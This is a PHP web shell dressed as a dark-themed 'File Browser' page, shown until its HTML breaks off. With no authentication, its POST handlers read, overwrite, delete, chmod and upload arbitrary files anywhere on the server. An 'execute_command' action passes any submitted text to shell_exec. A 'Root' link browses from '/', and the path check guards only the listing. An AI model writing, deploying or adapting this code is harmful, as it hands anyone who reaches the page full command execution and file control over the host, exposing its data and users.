<?php
ob_start();
error_reporting(E_ALL);
ini_set('display_errors', 0);
error_log("Script started");
ini_set('error_log', 'error.log'); // Replace with an actual path where you have write permissions

error_log("POST data: " . print_r($_POST, true));
error_log("GET data: " . print_r($_GET, true));

 // Get the current working directory (no need to hardcode a path)
 $baseDir = getcwd();


$root_directory = __DIR__; // This sets the root directory to the current script's directory
$requested_path = isset($_GET['dir']) ? $_GET['dir'] : '';
$full_path = realpath($root_directory . DIRECTORY_SEPARATOR . $requested_path);

// Security check: Make sure the requested path is within the allowed directory
if ($full_path === false || strpos($full_path, $root_directory) !== 0) {
    $full_path = $root_directory;
}

error_log("Root directory: " . $root_directory);
error_log("Requested path: " . $requested_path);
error_log("Full path: " . $full_path);


// Backend logic
$action = isset($_POST['action']) ? $_POST['action'] : '';
function sanitize_input($input) {
    return htmlspecialchars(strip_tags(trim($input)), ENT_QUOTES, 'UTF-8');
}

switch ($action) {
    case 'get_content':
        $file = urldecode($_POST['file']);
        if (file_exists($file) && is_file($file)) {
            echo json_encode(['content' => file_get_contents($file)]);
        } else {
            echo json_encode(['error' => 'File not found or is not a regular file.']);
        }
        exit;

    case 'save':
        $file = urldecode($_POST['file']);
        $content = $_POST['content'];
        if (file_exists($file) && is_file($file)) {
            if (file_put_contents($file, $content) !== false) {
                echo json_encode(['message' => 'File saved successfully.']);
            } else {
                echo json_encode(['error' => 'Error saving file.']);
            }
        } else {
            echo json_encode(['error' => 'File not found or is not a regular file.']);
        }
        exit;

        case 'rename':
            error_log("Rename action triggered");
            $oldName = urldecode($_POST['oldName']);
            $newName = dirname($oldName) . DIRECTORY_SEPARATOR . basename($_POST['newName']);
            $isDir = isset($_POST['is_dir']) && $_POST['is_dir'] == 1;
            
            error_log("Old name: " . $oldName);
            error_log("New name: " . $newName);
            error_log("Is directory: " . ($isDir ? "Yes" : "No"));
            
            if (file_exists($oldName)) {
                if (rename($oldName, $newName)) {
                    error_log(($isDir ? "Directory" : "File") . " renamed successfully");
                    echo json_encode(['success' => true, 'message' => ($isDir ? 'Folder' : 'File') . ' renamed successfully.']);
                } else {
                    $error = error_get_last();
                    error_log("Rename failed. Error: " . $error['message']);
                    echo json_encode(['success' => false, 'message' => 'Error renaming ' . ($isDir ? 'folder' : 'file') . '. Error: ' . $error['message']]);
                }
            } else {
                error_log("File or folder not found: " . $oldName);
                echo json_encode(['success' => false, 'message' => 'File or folder not found.']);
            }
            exit;

    case 'delete':
            $file = urldecode($_POST['file']);
            $isDir = isset($_POST['is_dir']) && $_POST['is_dir'] == 1;
            $confirmed = isset($_POST['confirmed']) && $_POST['confirmed'] == 1;
            
            function deleteDirectory($dir) {
                if (!file_exists($dir)) {
                    return true;
                }
                if (!is_dir($dir)) {
                    return unlink($dir);
                }
                foreach (scandir($dir) as $item) {
                    if ($item == '.' || $item == '..') {
                        continue;
                    }
                    if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
                        return false;
                    }
                }
                return rmdir($dir);
            }
        
            function countFiles($dir) {
                $count = 0;
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                foreach ($files as $fileinfo) {
                    $count++;
                }
                return $count;
            }
        
            if (file_exists($file)) {
                if ($isDir) {
                    $fileCount = countFiles($file);
                    if ($fileCount > 0 && !$confirmed) {
                        echo json_encode(['success' => false, 'message' => "This folder contains $fileCount item(s).", 'needConfirmation' => true]);
                    } else {
                        if (deleteDirectory($file)) {
                            echo json_encode(['success' => true, 'message' => 'Folder and its contents deleted successfully.']);
                        } else {
                            echo json_encode(['success' => false, 'message' => 'Error deleting folder and its contents.']);
                        }
                    }
                } else {
                    if (unlink($file)) {
                        echo json_encode(['success' => true, 'message' => 'File deleted successfully.']);
                    } else {
                        echo json_encode(['success' => false, 'message' => 'Error deleting file.']);
                    }
                }
            } else {
                echo json_encode(['success' => false, 'message' => 'File or folder not found.']);
            }
            exit;
            
    case 'chmod':
        $file = urldecode($_POST['file']);
        $permissions = octdec($_POST['permissions']);
        $isDir = isset($_POST['is_dir']) && $_POST['is_dir'] == 1;
        if (file_exists($file)) {
            if (chmod($file, $permissions)) {
                echo json_encode(['message' => 'Permissions changed successfully.']);
            } else {
                echo json_encode(['error' => 'Error changing permissions.']);
            }
        } else {
            echo json_encode(['error' => 'File or folder not found.']);
        }
        exit;
        case 'create_file':
            $fileName = sanitize_input($_POST['file_name']);
    $content = $_POST['content'];
    $directory = urldecode($_POST['directory']);
    $filePath = $directory . DIRECTORY_SEPARATOR . $fileName;

    if (file_put_contents($filePath, $content) !== false) {
        echo json_encode(['success' => true, 'message' => 'File created successfully.']);
    } else {
        echo json_encode(['success' => false, 'message' => 'Error creating file.']);
    }
            exit;
            case 'autosave_file':
                $fileName = sanitize_input($_POST['file']);
                $fileContent = $_POST['content'];
                $directory = urldecode($_POST['directory']);
                $fullPath = $directory . DIRECTORY_SEPARATOR . $fileName;
            
                if (file_put_contents($fullPath, $fileContent) !== false) {
                    $fileInfo = [
                        'name' => $fileName,
                        'path' => urlencode($fullPath),
                        'size' => formatFileSize(filesize($fullPath)),
                        'permissions' => getSymbolicNotation(fileperms($fullPath)),
                        'modified' => date("Y-m-d H:i:s", filemtime($fullPath))
                    ];
                    echo json_encode([
                        'success' => true, 
                        'message' => ($isNew ? 'File created' : 'File updated') . ' successfully.',
                        'file' => $fileInfo
                    ]);
                } else {
                    echo json_encode(['success' => false, 'message' => 'Error autosaving file.']);
                }
                exit;
            case 'create_folder':
                $folder_name = sanitize_input($_POST['folder_name']);
                $directory = urldecode($_POST['directory']);
                $new_folder_path = $directory . DIRECTORY_SEPARATOR . $folder_name;
                error_log("Attempting to create folder: " . $new_folder_path);
                if (!file_exists($new_folder_path)) {
                    if (mkdir($new_folder_path, 0755, true)) {
                        error_log("Folder created successfully: " . $new_folder_path);
                        echo json_encode(['success' => true, 'message' => 'Folder created successfully']);
                    } else {
                        $error = error_get_last();
                        error_log("Failed to create folder: " . $new_folder_path . ". Error: " . $error['message']);
                        echo json_encode(['success' => false, 'message' => 'Failed to create folder. Error: ' . $error['message']]);
                    }
                } else {
                    error_log("Folder already exists: " . $new_folder_path);
                    echo json_encode(['success' => false, 'message' => 'Folder already exists']);
                }
                exit;           
}

// Handle downloads (GET request)
if (isset($_GET['action']) && $_GET['action'] === 'download' && isset($_GET['file'])) {
    $file = $_GET['file'];
    $filePath = realpath($full_path . DIRECTORY_SEPARATOR . $file);
    $isDir = isset($_GET['is_dir']) && $_GET['is_dir'] == '1';

    // Debug information
    error_log("Download requested for: " . $filePath);
    error_log("Full path: " . $full_path);
    error_log("File: " . $file);
    error_log("Is directory: " . ($isDir ? "Yes" : "No"));

    // Check if the file/folder exists and is within the allowed directory
    if ($filePath && strpos($filePath, realpath($root_directory)) === 0) {
        if (!$isDir && is_file($filePath)) {
            // File download
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($filePath));
            readfile($filePath);
            exit;
        } elseif ($isDir && is_dir($filePath)) {
            // Folder download
            $folderName = basename($filePath);
            $zipFileName = $folderName . '.zip';
            $zipFilePath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipFileName;

            // Use ZipArchive
            $zip = new ZipArchive();
            if ($zip->open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
                error_log("Cannot create zip file: " . $zipFilePath);
                die("Cannot create zip file.");
            }

            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($filePath),
                RecursiveIteratorIterator::LEAVES_ONLY
            );

            $fileCount = 0;
            foreach ($files as $name => $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($filePath) + 1);
                    if ($zip->addFile($filePath, $relativePath)) {
                        $fileCount++;
                    } else {
                        error_log("Failed to add file to zip: " . $filePath);
                    }
                }
            }

            $zip->close();

            if ($fileCount == 0) {
                error_log("No files were added to the zip archive.");
                die("Failed to create zip file: No files were added.");
            }

            if (!file_exists($zipFilePath) || filesize($zipFilePath) == 0) {
                error_log("Created zip file is empty or doesn't exist: " . $zipFilePath);
                die("Failed to create valid zip file.");
            }

            header('Content-Type: application/zip');
            header('Content-disposition: attachment; filename=' . $zipFileName);
            header('Content-Length: ' . filesize($zipFilePath));
            readfile($zipFilePath);
            unlink($zipFilePath);
            exit;
        } else {
            error_log("Invalid file or folder type: " . $filePath);
            die("Invalid file or folder type.");
        }
    } else {
        error_log("File or folder not found or access denied: " . $filePath);
        die("File or folder not found or access denied.");
    }
}


    
// Handle file creation
if (isset($_POST['action']) && $_POST['action'] == 'upload') {
    error_log("Upload action triggered");
    $directory = urldecode($_POST['directory']);
    $uploadDir = $directory . DIRECTORY_SEPARATOR;
    $uploadedFiles = [];
    $errors = [];

    error_log("Files in _FILES: " . print_r($_FILES, true));

    if (!isset($_FILES['files'])) {
        error_log("No files were sent in the request");
        echo json_encode(['success' => false, 'message' => 'No files were sent in the request']);
        exit;
    }

    foreach ($_FILES['files']['name'] as $key => $name) {
        $tmpName = $_FILES['files']['tmp_name'][$key];
        $uploadFile = $uploadDir . basename($name);

        error_log("Attempting to upload file: " . $name);
        error_log("Temporary name: " . $tmpName);
        error_log("Upload destination: " . $uploadFile);

        if (move_uploaded_file($tmpName, $uploadFile)) {
            $uploadedFiles[] = $name;
            error_log("Successfully uploaded: " . $name);
        } else {
            $errors[] = "Failed to upload $name";
            $phpError = error_get_last();
            error_log("Failed to upload file. Error: " . $phpError['message']);
        }
    }

    if (count($uploadedFiles) > 0) {
        $message = "Successfully uploaded: " . implode(", ", $uploadedFiles);
        if (count($errors) > 0) {
            $message .= ". Errors: " . implode(", ", $errors);
        }
        echo json_encode(['success' => true, 'message' => $message]);
    } else {
        echo json_encode(['success' => false, 'message' => 'No files were uploaded successfully. ' . implode(", ", $errors)]);
    }
    exit;
}





// Handle command execution
if (isset($_POST['action']) && $_POST['action'] == 'execute_command') {
    $command = $_POST['command'];
    
    // Check if the command is "cat" and target is a PHP file
    if (preg_match('/^cat\s+(.+\.php)$/', $command, $matches)) {
        $file = $matches[1];
        
        // Check if the file exists and is readable
        if (file_exists($file) && is_readable($file)) {
            // Output the raw PHP file contents
            $output = htmlspecialchars(file_get_contents($file)); // Escaping HTML to prevent execution
        } else {
            $output = "File does not exist or is not readable.";
        }
    } else {
        // Fallback to shell execution if it's not a "cat" command for a PHP file
        $output = shell_exec($command . " 2>&1");
    }
    
    echo json_encode(['success' => true, 'output' => $output]);
    exit;
}

// Frontend code
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Browser</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background-color: #0d1117;
            color: #e6edf3;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
        }

        .container {
            background: #161b22;
            border-radius: 10px; 
            padding: 24px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
            margin-top: 50px;
            overflow-y: auto;
        }

        .list-group-item {
            background: #0d1117;
            padding: 0.5rem 1rem;
            border: 1px solid #30363d;
            color: #e6edf3;
            margin-bottom: 8px;
            border-radius: 6px;
            transition: all 0.2s ease;
        }

        .list-group-item > div{
            padding: 0 0.5rem;
        }

        .permission-notation{
            font-family:monospace;
            font-size: 0.9em;
        }

        .action-buttons{
            display: block;
            justify-content:center;
        }

        .action-buttons .dropdown-toggle {
    padding: 0.1rem 0.3rem;
    font-size: 0.8rem;
}

        

        .btn-group .btn{
            padding: 0.1em 0.3rem;
            font-size:0.8rem;
        }

        .list-group-item:hover {
            background: #161b22;
            border-color: #8b949e;
        }

        .file-info {
    flex: 1;
        }
.file-details {
    font-size: 0.9em;
    color: #6c757d;
   }
.permission-notation {
    font-family: monospace;
}

        .btn {
            border-radius: 6px;
            padding: 5px 16px;
            transition: all 0.2s ease;
            background-color: #21262d;
            border-color: rgba(240, 246, 252, 0.1);
            color: #ffffff;
        }

        .btn:hover {
            background-color: #30363d;
            border-color: #8b949e;
        }

        .btn-primary {
            background-color: #238636;
            border-color: rgba(240, 246, 252, 0.1);
            color: #ffffff;
        }
        
        
        .btn-danger{
            background-color:  #dc3545;
            border-color: rgba(240, 246, 252, 0.1);
            color: #ffffff;
        }

       .modal-title{
              display:none;
        }


        .btn-primary:hover {
            background-color: #2ea043;
            border-color: rgba(240, 246, 252, 0.1);
        }

        .modal-content {
            background: #161b22;
            color: #e6edf3; 
            border-radius: 6px;
            border: 1px solid #30363d;
        }

        .modal-header, .modal-footer {
            border-color: #30363d;
        }

        .form-control {
            background-color: #0d1117;
            border-color: #30363d;
            color: #e6edf3; 
        }

        .form-control:focus {
            background-color: #0d1117;
            border-color: #58a6ff;
            color: #e6edf3; 
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.3);
        }

        a {
            color: #58a6ff; 
        }

        a:hover {
            color: #79c0ff;
        }

        /* Theme switch styles */
        .theme-switch-wrapper {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .theme-switch {
            display: inline-block;
            height: 34px;
            position: relative;
            width: 60px;
        }

        .theme-switch input {
            display: none;
        }

        .slider {
            background-color: #ccc;
            bottom: 0;
            cursor: pointer;
            left: 0;
            position: absolute;
            right: 0;
            top: 0;
            transition: .4s;
        }

        .slider:before {
            background-color: #fff;
            bottom: 4px;
            content: "";
            height: 26px;
            left: 4px;
            position: absolute;
            transition: .4s;
            width: 26px;
        }

        input:checked + .slider {
            background-color: #66bb6a;
        }

        input:checked + .slider:before {
            transform: translateX(26px);
        }

        .slider.round {
            border-radius: 34px;
        }

        .slider.round:before {
            border-radius: 50%;
        }

        /* Light mode styles */
        body.light-mode {
            background-color: #ffffff;
            color: #24292e;
            background-image: url('https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/b95c85d9-a026-4b38-bbec-3211a37d0d50/dghob8c-12b1170d-8858-4143-870c-0d07c6f6e83c.png/v1/fill/w_1171,h_682,q_70,strp/kali_linux_wallpaper_space_by_khedrmk_dghob8c-pre.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NzQ2IiwicGF0aCI6IlwvZlwvYjk1Yzg1ZDktYTAyNi00YjM4LWJiZWMtMzIxMWEzN2QwZDUwXC9kZ2hvYjhjLTEyYjExNzBkLTg4NTgtNDE0My04NzBjLTBkMDdjNmY2ZTgzYy5wbmciLCJ3aWR0aCI6Ijw9MTI4MCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.ycet6iuRmOehpCz11r7cybatVL9eh36IRDxB-XIZlFg');
            background-size: cover;
            background-position: center center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }

        body.light-mode .container {
            background-color: rgba(0, 0, 0, 0.7);
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
        }

        body.light-mode .list-group-item {
            background-color: rgba(30, 30, 30, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.125);
            color: #ffffff;
        }

        body.light-mode .list-group-item:hover {
            background-color: rgba(50, 50, 50, 0.9);
        }

        body.light-mode a {
            color: #58a6ff;
        }

        body.light-mode a:hover {
            color: #79c0ff;
        }

body.light-mode .btn:hover {
    background: rgba(255, 255, 255, 0.2);
    box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
}

/* Custom scrollbar for webkit browsers */
body.light-mode::-webkit-scrollbar {
    width: 10px;
}

body.light-mode::-webkit-scrollbar-track {
    background: rgba(255, 255, 255, 0.1);
}

body.light-mode::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.3);
    border-radius: 5px;
}

body.light-mode::-webkit-scrollbar-thumb:hover {
    background: rgba(255, 255, 255, 0.5);
}
       


        body.light-mode .btn-outline-primary,
        body.light-mode .btn-outline-info,
        body.light-mode .btn-outline-danger,
        body.light-mode .btn-outline-success,
        body.light-mode .btn-outline-warning {
            color: #ffffff;
            border-color: #ffffff;
        }

        body.light-mode .btn-outline-primary:hover,
        body.light-mode .btn-outline-info:hover,
        body.light-mode .btn-outline-danger:hover,
        body.light-mode .btn-outline-success:hover,
        body.light-mode .btn-outline-warning:hover {
            background-color: rgba(255, 255, 255, 0.2);
        }

        /* Icon colors */
        .bi-pencil { color: #3498db; }  /* Edit - Asul */
        .bi-pencil-square { color: #f1c40f; }  /* Rename - Dilaw */
        .bi-trash { color: #e74c3c; }  /* Delete - Pula */
        .bi-download { color: #2ecc71; }  /* Download - Berde */
        .bi-shield-lock { color: #95a5a6; }  /* Change Permissions - Kulay-abo */

        /* Hover effects */
        .btn:hover .bi-pencil { color: #2980b9; }
        .btn:hover .bi-pencil-square { color: #f39c12; }
        .btn:hover .bi-trash { color: #c0392b; }
        .btn:hover .bi-download { color: #27ae60; }
        .btn:hover .bi-shield-lock { color: #7f8c8d; }

        /* Dark mode adjustments */
        body:not(.light-mode) .bi-pencil { color: #3498db; }
        body:not(.light-mode) .bi-pencil-square { color: #f1c40f; }
        body:not(.light-mode) .bi-trash { color: #e74c3c; }
        body:not(.light-mode) .bi-download { color: #2ecc71; }
        body:not(.light-mode) .bi-shield-lock { color: #bdc3c7; }

        /* Light mode adjustments */
        body.light-mode .bi-pencil { color: #2980b9; }
        body.light-mode .bi-pencil-square { color: #f39c12; }
        body.light-mode .bi-trash { color: #c0392b; }
        body.light-mode .bi-download { color: #27ae60; }
        body.light-mode .bi-shield-lock { color: #95a5a6; }

        .breadcrumb {
            border: 1px solid;
            transition: all 0.3s ease;
            padding: 0.75rem 1rem;
            margin-bottom: 1rem;
            border-radius: 0.25rem;
        }

        .breadcrumb:hover {
            box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.15) !important;
        }

        .breadcrumb-item + .breadcrumb-item::before {
            content: "›";
        }

        .breadcrumb-item a {
            transition: color 0.2s ease;
        }

        .breadcrumb-item a:hover {
            text-decoration: underline !important;
        }

        /* Light mode styles */
        body.light-mode .breadcrumb {
            background-color: #f6f8fa;
            border-color: #d0d7de;
        }

        body.light-mode .breadcrumb-item + .breadcrumb-item::before {
            color: #6c757d;
        }

        body.light-mode .breadcrumb-item a {
            color: #0969da;
        }

        body.light-mode .breadcrumb-item a:hover {
            color: #0a58ca;
        }

        body.light-mode .breadcrumb-item.active {
            color: #24292f;
        }

        /* Dark mode styles */
        body:not(.light-mode) .breadcrumb {
            background-color: #161b22;
            border-color: #30363d;
        }

        body:not(.light-mode) .breadcrumb-item + .breadcrumb-item::before {
            color: #8b949e;
        }

        body:not(.light-mode) .breadcrumb-item a {
            color: #58a6ff;
        }

        body:not(.light-mode) .breadcrumb-item a:hover {
            color: #79c0ff;
        }

        body:not(.light-mode) .breadcrumb-item.active {
            color: #c9d1d9;
        }

        .list-group-item i {
            margin-right: 10px;
            width: 20px;
            text-align: center;
        }

        /* Adjust icon colors for dark mode */
        body:not(.light-mode) .fa-folder {
            color: #ffd700 !important;
        }

        body:not(.light-mode) .fa-image {
            color: #28a745 !important;
        }

        body:not(.light-mode) .fa-video {
            color: #dc3545 !important;
        }

        body:not(.light-mode) .fa-music {
            color: #17a2b8 !important;
        }

        body:not(.light-mode) .fa-file-pdf {
            color: #dc3545 !important;
        }

        body:not(.light-mode) .fa-file-word {
            color: #007bff !important;
        }

        body:not(.light-mode) .fa-file-excel {
            color: #28a745 !important;
        }

        body:not(.light-mode) .fa-file-powerpoint {
            color: #ffc107 !important;
        }

        body:not(.light-mode) .fa-file-archive {
            color: #6c757d !important;
        }

        body:not(.light-mode) .fa-php {
            color: #a074c4 !important;
        }

        body:not(.light-mode) .fa-html5 {
            color: #dc3545 !important;
        }

        body:not(.light-mode) .fa-css3-alt {
            color: #007bff !important;
        }

        body:not(.light-mode) .fa-js-square {
            color: #ffc107 !important;
        }

        body:not(.light-mode) .fa-file {
            color: #6c757d !important;
        }

 body:not(.light-mode) #renameNewFileName {
    background-color: #2c3e50;
    color: #ffffff;
    border-color: #34495e;
}

body:not(.light-mode) #renameNewFileName:focus {
    background-color: #34495e;
    color: #ffffff;
    border-color: #3498db;
    box-shadow: 0 0 0 0.2rem rgba(52, 152, 219, 0.25);
}

/* Styles for the modal in light mode */
body.light-mode .modal-content {
    background-color: #ffffff;
    color: #333333;
}

body.light-mode .modal-header {
    border-bottom-color: #dee2e6;
}

body.light-mode .modal-footer {
    border-top-color: #dee2e6;
}

body.light-mode .modal-title {
    color: #333333;
}


body:not(.light-mode) .modal-content {
    background-color: #2c3e50;
    color: #ecf0f1;
}

body:not(.light-mode) .modal-header {
    border-bottom-color: #34495e;
}

body:not(.light-mode) .modal-footer {
    border-top-color: #34495e;
}

body:not(.light-mode) .modal-title {
    color: #ecf0f1;
}


        /* Modal styles */
.modal-content {
    background-color: #f8f9fa;
    border: none;
    border-radius: 0.3rem;
}

.modal-header {
    border-bottom: 1px solid #dee2e6;
    background-color: #e9ecef;
}

.modal-footer {
    border-top: 1px solid #dee2e6;
    background-color: #e9ecef;
}

/* Terminal styles */
#terminal-output {
    font-family: 'Courier New', Courier, monospace;
    font-size: 0.9rem;
}

#terminal-input {
    font-family: 'Courier New', Courier, monospace;
}


.navbar-toggler {
            padding: .25rem .75rem;
            font-size: 1.25rem;
            line-height: 1;
            background-color: transparent;
            border:none;
            border-radius: .25rem;
            transition: box-shadow .15s ease-in-out;
        }
        .navbar-toggler-icon {
            display: inline-block;
            width: 1.5em;
            height: 1.5em;
            vertical-align: middle;
            background-repeat: no-repeat;
            background-position: center;
            background-size: 100%;
        }

        .navbar-toggler:focus {
        outline: none;
        box-shadow: 0 0 0 0.25rem rgba(13, 110, 253, 0.25);
       }

       .navbar-toggler[aria-expanded="true"] .navbar-toggler-icon {
    transform: rotate(90deg);
}

       
    /* Light mode hamburger icon (Bootstrap blue) */
    body.light-mode .navbar-toggler-icon {
        background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3e%3cpath stroke='rgba%280, 123, 255, 1%29' stroke-linecap='round' stroke-miterlimit='10' stroke-width='2' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e");
    }

    /* Dark mode hamburger icon (Bootstrap red) */
    body:not(.light-mode) .navbar-toggler-icon {
        background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3e%3cpath stroke='rgba%28220, 53, 69, 1%29' stroke-linecap='round' stroke-miterlimit='10' stroke-width='2' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e");
    }


  @media (max-width: 767.98px) {
    .button-container-mobile {
        display: flex;
        flex-direction: column;
    }
    .button-container-mobile .btn {
        margin-bottom: 0.5rem;
    }
    .navbar-toggler {
        padding: .25rem .75rem;
        font-size: 1.25rem;
        line-height: 1;
        background-color: transparent;
        border: 1px solid transparent;
        border-radius: .25rem;
        transition: box-shadow .15s ease-in-out;
    }
    .navbar-toggler-icon {
        display: inline-block;
        width: 1.5em;
        height: 1.5em;
        vertical-align: middle;
        background-repeat: no-repeat;
        background-position: center;
        background-size: 100%;
        background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3e%3cpath stroke='rgba%280, 0, 0, 0.55%29' stroke-linecap='round' stroke-miterlimit='10' stroke-width='2' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e");
    }

    .list-group {
        overflow-x: auto;
        white-space: nowrap;
        padding-bottom: 15px; /* Add some bottom padding for the scrollbar */
    }

    .list-group-item {
        display: inline-block;
        width: max-content; /* Allow content to determine width */
        min-width: 100%; /* Ensure it's at least full width */
        position: relative;
    }

    .list-group-item > div {
        display: inline-block;
        vertical-align: middle;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        padding-right: 10px;
        box-sizing: border-box;
    }

    /* Adjust widths for mobile */
    .list-group-item > div:nth-child(1) { min-width: 200px; } /* Name */
    .list-group-item > div:nth-child(2) { min-width: 80px; }  /* Size */
    .list-group-item > div:nth-child(3) { min-width: 100px; } /* Permissions */
    .list-group-item > div:nth-child(4) { min-width: 150px; } /* Last Modified */
    .list-group-item > div:nth-child(5) { min-width: 80px; }  /* Actions */

    .list-group-item {
        width: 650px; /* Sum of all column widths */
    }

    /* Add some padding to separate columns */
    .list-group-item > div {
        padding-right: 15px;
    }

    .dropdown {
        position: static;
    }

    /* Ensure the dropdown menu is visible */
    .dropdown-menu {
        position: absolute;
        top: auto;
        left: auto;
        right: 150px; /* Adjust this value as needed */
        bottom: 100%; /* Position above the button */
        margin-bottom: 5px; /* Small gap between button and menu */
        max-height: 200px;
        overflow-y: auto;
    }

     /* Ensure the dropdown toggle button is clickable */
     .dropdown-toggle {
        z-index: 1;
        position: relative;
    }

    .list-group-item:last-child .dropdown-menu {
        bottom: auto;
        top: 100%;
        margin-top: 5px;
        margin-bottom: 0;
    }
    

    @keyframes scrollHint {
        0% { transform: translateX(0); }
        75% { transform: translateX(10px); }
        100% { transform: translateX(0); }
    }

    .list-group::after {
        content: '→';
        position: absolute;
        right: 10px;
        top: 50%;
        transform: translateY(-50%);
        animation: scrollHint 1.5s infinite;
        opacity: 0.5;
    }
}

.list-group::-webkit-scrollbar {
        height: 0;
        width: 0;
    }

@media (min-width: 768px) {
    .button-container {
        display: flex !important;
    }

    .list-group-item > div:nth-child(1) { width: 40%; }
    .list-group-item > div:nth-child(2) { width: 15%; }
    .list-group-item > div:nth-child(3) { width: 15%; }
    .list-group-item > div:nth-child(4) { width: 20%; }
    .list-group-item > div:nth-child(5) { width: 10%; }
}

@media (max-width: 991px) {
    .navbar-toggler {
        display: block !important;
    }

    .navbar-collapse {
        display: none !important;
    }

    .navbar-collapse.show {
        display: block !important;
    }

    .button-container {
        display: none !important;
    }

    .button-container-mobile {
        display: flex !important;
        flex-direction: column;
    }

    .button-container-mobile .btn {
        margin-bottom: 0.5rem;
    }
}

@media (min-width: 992px) {
    .navbar-toggler {
        display: none !important;
    }

    .navbar-collapse {
        display: block !important;
    }

    .button-container {
        display: flex !important;
    }

    .button-container-mobile {
        display: none !important;
    }
}
    </style>
</head>
<body>
    <div class="theme-switch-wrapper">
        <label class="theme-switch" for="checkbox">
            <input type="checkbox" id="checkbox" />
            <div class="slider round"></div>
        </label>
    </div>


    <div class="container mt-4">
        <!-- <h1 class="mb-4">File Browser</h1>  -->
         <!-- <div class="d-flex justify-content-between align-items-center mb-3">
        <div>
            <a href="?dir=/" class="btn btn-primary me-2">Root</a>
            <a href="?dir=<?php echo urlencode($baseDir); ?>" class="btn btn-danger">Home</a>
        </div>
        <div>
            <button id="createFolderBtn"  class="btn btn-success me-2" data-bs-toggle="modal" data-bs-target="#newFolderModal">
                <i class="fas fa-folder-plus"></i> New Folder
            </button>
            <button id="createFileBtn" class="btn btn-info me-2" data-bs-toggle="modal" data-bs-target="#newFileModal">
                <i class="fas fa-file"></i> New File
            </button>
            <button class="btn btn-warning me-2" data-bs-toggle="modal" data-bs-target="#uploadFileModal">
                <i class="fas fa-upload"></i> Upload File
            </button>
            <button class="btn btn-secondary" data-bs-toggle="modal" data-bs-target="#terminalModal">
                <i class="fas fa-terminal"></i> Terminal
            </button>
        </div>
    </div> -->
      
    <div class="d-flex justify-content-between align-items-center mb-3">
        <button class="navbar-toggler d-md-none" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="button-container d-none d-md-flex justify-content-between w-100">
            <div>
                <a href="?dir=/" class="btn btn-primary me-2">Root</a>
                <a href="?dir=<?php echo urlencode($baseDir); ?>" class="btn btn-danger me-2">Home</a>
            </div>
            <div>
                <button id="createFolderBtn" class="btn btn-success me-2" data-bs-toggle="modal" data-bs-target="#newFolderModal">
                    <i class="fas fa-folder-plus"></i> New Folder
                </button>
                <button id="createFileBtn" class="btn btn-info me-2" data-bs-toggle="modal" data-bs-target="#newFileModal">
                    <i class="fas fa-file"></i> New File
                </button>
                <button class="btn btn-warning me-2" data-bs-toggle="modal" data-bs-target="#uploadFileModal">
                    <i class="fas fa-upload"></i> Upload File
                </button>
                <button class="btn btn-secondary" data-bs-toggle="modal" data-bs-target="#terminalModal">
                    <i class="fas fa-terminal"></i> Terminal
                </button>
            </div>
        </div>
    </div>
    
    <div class="collapse navbar-collapse d-md-none" id="navbarCollapse">
        <div class="button-container-mobile">
            <a href="?dir=/" class="btn btn-primary btn-block mb-2">Root</a>
            <a href="?dir=<?php echo urlencode($baseDir); ?>" class="btn btn-danger btn-block mb-2">Home</a>
            <button id="createFolderBtnMobile" class="btn btn-success btn-block mb-2" data-bs-toggle="modal" data-bs-target="#newFolderModal">
                <i class="fas fa-folder-plus"></i> New Folder
